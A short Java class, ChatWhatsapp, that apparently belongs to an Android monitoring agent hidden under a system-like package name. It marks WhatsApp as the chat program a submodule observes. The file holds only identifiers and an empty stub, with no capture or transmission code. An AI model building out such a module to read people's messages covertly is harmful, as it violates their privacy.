package com.android.networking.module.submodule;


public class ChatWhatsapp extends SubModuleChat {
	private static final int PROGRAM_WHATSAPP = 0x06;
	String pObserving = "whatsapp";

	@Override
	int getProgramId() {
		return PROGRAM_WHATSAPP;
	}

	@Override
	String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram() {
		// TODO Auto-generated method stub
		
	}
	
	
}
